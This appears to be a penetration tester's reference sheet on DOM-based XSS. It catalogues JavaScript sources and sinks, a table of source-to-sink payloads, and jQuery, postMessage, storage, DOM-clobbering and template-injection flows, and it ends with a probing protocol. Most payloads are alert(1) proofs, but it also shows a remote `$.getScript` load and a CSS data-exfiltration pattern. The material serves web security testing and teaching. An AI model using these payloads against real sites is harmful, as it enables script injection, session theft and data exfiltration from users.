# DOM XSS — sources, sinks, and the flows between them

DOM XSS never touches the server's HTML — a JS source reads
attacker input and a JS sink writes it somewhere dangerous. The
server response can be 100% clean; the vulnerability lives in the
page's own JavaScript.

The pair to find: `source → [transforms] → sink` with no sanitizer
between. Sources are READS of attacker-controllable state; sinks
are WRITES that execute.

---

## 1. Sources — where attacker input enters JS

```javascript
// URL fragments — the #1 DOM source:
location.hash              // '#<img src=x onerror=alert(1)>'
location.hash.slice(1)     // same without '#'
location.search            // '?x=payload'
location.href              // whole URL
location.pathname          // /path/in/uri
location                   // the Location object (stringified)

// document-level:
document.URL               // full URL
document.documentURI       // same
document.baseURI           // base URI (clobberable)
document.referrer          // referrer header — attacker page sets it
document.cookie            // cookie — if the app sets attacker data

// window-level:
window.name                // persists across navigations — the
                           // classic cross-page carrier:
                           // window.open('','x',''); then target
                           // reads window.name → payload
localStorage.x             // persists — set by a prior page
sessionStorage.x           // per-tab
indexedDB                  // same

// messaging:
window.postMessage         // event.data — needs a listener
                           // without origin check (postmessage.md)

// misc:
history.state              // pushState'd data
performance.getEntries()   // timing entries can leak
navigator.*                // UA etc — rarely attacker-set
```

window.name is special — the opener sets it BEFORE navigation; the
payload survives the load:

```javascript
// attacker page:
window.name = '<img src=x onerror=alert(1)>';
location = 'https://target/page';   // target reads window.name
```

---

## 2. Sinks — where it lands and executes

### Markup sinks — the HTML-writing set

```javascript
el.innerHTML = x              // parses HTML — handlers/svg fire;
                              // <script> does NOT run via innerHTML
el.outerHTML = x              // replaces the element entirely
el.insertAdjacentHTML('beforeend', x)
document.write(x)             // markup parse — script DOES run
document.writeln(x)
Range.createContextualFragment(x)
el.setHTML(x)                 // new Sanitizer API — gated by browser
$(el).html(x)                 // jQuery — script DOES run (jQuery
                              // evals script tags itself)
$(el).append(x)               // same
$(el).prepend(x)              $(el).before(x)  $(el).after(x)
$(x)                          // $(htmlString) creates+evals
$.parseHTML(x)                $.globalEval(x)
el.srcdoc = x                 // iframe srcdoc attr
iframe.setAttribute('srcdoc', x)
```

innerHTML + `<script>` doesn't run — use `<img src=x onerror>` or
`<svg onload>`; jQuery's `.html()` DOES eval script tags (jQuery
extracts and evals them itself).

### Code sinks — string-as-JS

```javascript
eval(x)                        // direct eval — any JS
new Function(x)()               // Function constructor
setTimeout(x, 100)              // string arg = eval
setInterval(x, 100)             // string arg = eval
Function(x)                     // same
setImmediate(x)                 // IE
execScript(x)                   // IE
el.setAttribute('onclick', x)   // set-attr-event = code
el.onclick = x                  // function-valued — if x is a
                                // FUNCTION ref it's a call, if x is
                                // a string it won't run... but
                                // onclick='string' via setAttribute
                                // does
```

### URL sinks — navigation to attacker scheme

```javascript
location = x                    location.href = x
location.assign(x)              location.replace(x)
document.location = x           window.location = x
el.src = x                      iframe/script src — javascript:
el.href = x                     anchor href — javascript: needs click
el.action = x                   form action — submit runs it
form.action = x                 formaction too
history.pushState(s,'',x)       -- URL-bar change (not exec by itself)
postMessage(x)                  -- second arg URL check
worker = new Worker(x)          -- worker source URL
import(x)                       -- dynamic import
```

`javascript:` inside these = code-exec. `data:` inside iframe src
= code-exec in a framed doc.

### CSS sinks — the overlay/exfil set

```javascript
el.style.cssText = x            el.style.background = 'url('+x+')'
el.setAttribute('style', x)     -- cssText-bearing
```

Rarely code-exec but: `background:url(//me/?c='+data+')` exfil or
`position:fixed;inset:0` overlay for clickjacking.

---

## 3. The flow classes — source→sink shapes

| Source | Sink | Payload |
|---|---|---|
| location.hash | innerHTML | `#<img src=x onerror=alert(1)>` |
| location.hash | eval | `#alert(1)` |
| location.search | innerHTML | `?x=<img src=x onerror=alert(1)>` |
| location.hash | document.write | `#<img src=x onerror=alert(1)>` |
| location.hash | location.href | `#javascript:alert(1)` |
| window.name | innerHTML | set via opener → `javascript:...` |
| document.referrer | innerHTML | attacker page's referrer |
| postMessage | innerHTML | `<img src=x onerror=alert(1)>` |
| postMessage | eval | `alert(1)` |
| localStorage | innerHTML | stored payload from prior page |
| URLSearchParams.get | innerHTML | `?x=<img...>` |
| history.state | innerHTML | pushed-state payload |
| RegExp.$1 | eval | regex-matched segment |
| document.cookie | eval | cookie set to `alert(1)` |
| location.hash | jQuery .html() | `#<script>alert(1)</script>` (jq evals!) |

---

## 4. jQuery-specific flows — the library is the sink

```javascript
// .html() / .append() / .prepend() — script-evaluating:
$('#x').html(location.hash.slice(1))
   → #<script>alert(1)</script> RUNS — jQuery evals scripts
   → #<img src=x onerror=alert(1)> also works

// $(html) — the selector-or-html ambiguity:
$(location.hash.slice(1))
   → $('#x') selects; $('<img...>') creates → context dependent
   → old jQuery: $(anything) treated as html → code runs

// $.get / $.getScript to attacker URLs:
$.getScript(location.hash.slice(1))    → remote script exec
$.get(location.hash.slice(1))          → ajax to your URL

// $.globalEval — direct eval:
$.globalEval(location.hash.slice(1))
```

jQuery ≤3.3's `$(...)` treated strings as HTML when they looked
like it — `$(location.hash)` with `#<img src=x onerror=...>`
created the element and ran the handler.

---

## 5. postMessage flows — the listener without origin check

```javascript
// the vuln listener:
window.addEventListener('message', function(e){
   document.getElementById('x').innerHTML = e.data;
});
// no e.origin check → any frame can post:
target.postMessage('<img src=x onerror=alert(1)>', '*');
```

`postmessage.md` is the full listener-hunt file. The attack chain:
embed target in iframe, postMessage into it, or open-window and
postMessage to the opener.

---

## 6. Storage-carried flows — localStorage/sessionStorage

```javascript
// page1: attacker plants (their own page or via another vuln):
localStorage.x = '<img src=x onerror=alert(1)>';

// page2 on same origin later:
el.innerHTML = localStorage.x;   → fires
```

The chain needs the write primitive on the same origin — often
combined with another XSS or a sub-domain leak.

---

## 7. URL-parameter flows — `?x=` variants

```javascript
// modern:
new URLSearchParams(location.search).get('x')   → sink
location.search.split('x=')[1]                  → sink
/decodeURIComponent(...)
```

The double-decode bug: the server decodes once, the JS decodes
again → `%2527` becomes `'` only after both — encode your payload
once for the JS layer:

```text
?x=%3Cimg%20src=x%20onerror=alert(1)%3E   → JS decodes once → <img..>
?x=%253Cimg...                            → JS decodes once → %3Cimg
                                          → stays encoded (safe)
```

The split-and-join flows: `location.search.split('&')` patterns
where each `k=v` chunk is assigned — `&` inside a value breaks it
unless %-encoded.

---

## 8. The regex/index flows — partial extraction

```javascript
location.href.match(/id=(\w+)/)[1]     → \w+ only — no < allowed
   → payload limited to [a-zA-Z0-9_] → rarely exploitable this way
location.hash.match(/^#!(.*)/)[1]      → .* allows anything
```

Match-bounded sources limit the alphabet — check the regex BEFORE
assuming full payloads fit.

---

## 9. DOM-clobbering flows — a special DOM class

```html
<!-- inject named/id'd elements that BECOME globals: -->
<a id=x href=javascript:alert(1)>       → window.x = the anchor
<img id=x name=y src=z>                  → window.x.y = attr
<form id=x><input name=y></form>         → x.y = the input
```

If the JS does `x.something` where `x` is expected to be a JS
object — your anchor/input substitutes:

```javascript
// app:
if (config.isAdmin) ...
// your inject:
<a id=config name=isAdmin href=1>   → config.isAdmin = anchor el
                                      → truthy → privilege pivot
// then:
<a id=load href=javascript:alert(1)>  → load.click()?
```

`gadgets.md` covers the DOM-clobber library.

---

## 10. The detection flow — how to find source→sink pairs

```text
1. enumerate sources (grep the bundle for §1 names)
2. enumerate sinks (grep for §2 names)
3. for each source, trace every read to a sink — through vars,
   functions, promise chains, async
4. note any transform between (sanitizer? parse? encode?)
5. the surviving source→sink pairs are the XSS candidates
```

jS source-map recovery helps — `tools/web/bundle_miner.py` digs
minified bundles for the source names.

```javascript
// manual tracing pattern:
var x = location.hash.slice(1);     // source
var y = decodeURIComponent(x);       // transform (another decode)
el.innerHTML = y;                     // sink — DOM XSS confirmed
```

Each transform either kills the flow (sanitizer, parseInt, etc.) or
preserves it (decodeURIComponent, replace, split/join).

---

## 11. Framework-sink shortcuts — the template-eval paths

```javascript
// angular expression in a bound attribute — the {{}} eval:
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
// vue template:
<div id=app>{{_c.constructor('alert(1)')()}}</div>
// handlebars {{this}} + helper injection — see framework-sinks.md
```

These are DOM-adjacent — the framework's own template engine is
the sink. `framework-sinks.md` is the full file.

---

## 12. The testing protocol

```text
1. find the page with a hash/search-driven render
2. #<img src=x onerror=alert(1)> — the first probe
3. #<svg onload=alert(1)> — the no-src-needed variant
4. #<script>alert(1)</script> — for jQuery sinks
5. #alert(1) — for eval/Function sinks
6. ?x= variants for search-param sources
7. javascript:alert(1) for URL sinks
```

The falsifier: the marker never reaches a sink — innerHTML shows
nothing, eval never runs it, location never navigates. Then the
source→sink path doesn't exist and the page is clean for this class.
